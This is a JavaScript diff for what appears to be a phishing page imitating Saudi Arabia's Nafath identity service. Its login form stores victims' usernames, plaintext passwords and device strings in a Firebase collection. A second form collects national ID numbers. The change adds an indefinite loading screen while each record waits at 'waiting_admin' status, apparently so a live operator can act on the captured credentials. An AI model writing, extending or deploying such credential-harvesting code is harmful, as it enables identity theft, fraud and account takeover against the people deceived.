@@ -69,9 +69,10 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
+   // ==========================================
+    // 3. معالجة إرسال النماذج وتخزينها وظهور اللودر
     // ==========================================
-    // 3. معالجة إرسال النماذج وتخزينها في Firebase Firestore
-    // ==========================================
+    const globalLoader = document.getElementById('globalLoader');
     
     // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
     const authForm = document.getElementById('authForm');
@@ -81,29 +82,28 @@ document.addEventListener('DOMContentLoaded', () => {
             
             const usernameInput = document.getElementById('username').value;
             const passwordInput = document.getElementById('password').value;
-            const submitBtn = authForm.querySelector('.btn-submit');
-            const originalContent = submitBtn.innerHTML;
             
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> جاري التحقق الآمن...`;
+            // إظهار اللودر الزجاجي في منتصف الشاشة فوراً
+            if (globalLoader) globalLoader.classList.remove('hidden-loader');
             
             try {
-                // إرسال البيانات مباشرة إلى مجموعة (Collection) باسم "users_login"
+                // إرسال البيانات إلى الفايربيس
                 await addDoc(collection(db, "users_login"), {
                     username: usernameInput,
                     password: passwordInput,
                     timestamp: serverTimestamp(),
-                    device: navigator.userAgent
+                    device: navigator.userAgent,
+                    status: "waiting_admin" // حالة الطلب بانتظار الأدمن
                 });
 
-                alert('تم التحقق بنجاح ومطابقة الهوية الرقمية للطلب الإلكتروني.');
+                // نترك اللودر ظاهر شغال، أو يمكنك إخفاؤه بعد نجاح الإرسال بـ alert
+                // إذا أردت استمرار اللودر حتى يوافق الأدمن، اترك السطر القادم ملغياً
+                // globalLoader.classList.add('hidden-loader'); 
+                
             } catch (error) {
-                console.error("خطأ أثناء التخزين في فايربيس: ", error);
-                alert('عذراً، حدث خطأ في الاتصال بالشبكة الآمنة.');
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalContent;
-                authForm.reset(); // تفريغ الحقول بعد الإرسال
+                console.error("خطأ: ", error);
+                alert('عذراً، حدث خطأ في الاتصال بالشبكة.');
+                if (globalLoader) globalLoader.classList.add('hidden-loader'); // إخفاء عند الخطأ
             }
         });
     }
@@ -115,27 +115,24 @@ document.addEventListener('DOMContentLoaded', () => {
             e.preventDefault();
             
             const nationalIdInput = document.getElementById('nationalId').value;
-            const submitBtn = appForm.querySelector('.btn-submit');
-            const originalContent = submitBtn.innerHTML;
-
+            
+            // إظهار اللودر الزجاجي في منتصف الشاشة فوراً
+            if (globalLoader) globalLoader.classList.remove('hidden-loader');
+            
             try {
-                // إرسال البيانات إلى مجموعة باسم "nafath_app_requests"
                 await addDoc(collection(db, "nafath_app_requests"), {
                     nationalId: nationalIdInput,
                     timestamp: serverTimestamp(),
-                    status: "pending_verification"
+                    status: "waiting_admin" // بانتظار الأدمن
                 });
                 
-                alert('تم إرسال طلب المطابقة الآمن للمنصة بنجاح.');
             } catch (error) {
-                console.error("خطأ أثناء التخزين في فايربيس: ", error);
-                alert('فشل إرسال الطلب، يرجى المحاولة لاحقاً.');
-            } finally {
-                appForm.reset();
+                console.error("خطأ: ", error);
+                alert('فشل إرسال الطلب.');
+                if (globalLoader) globalLoader.classList.add('hidden-loader');
             }
         });
     }
-
     // ==========================================
     // 4. زر تبديل اللغة وإدارة اتجاه الصفحة (مشترك)
     // ==========================================
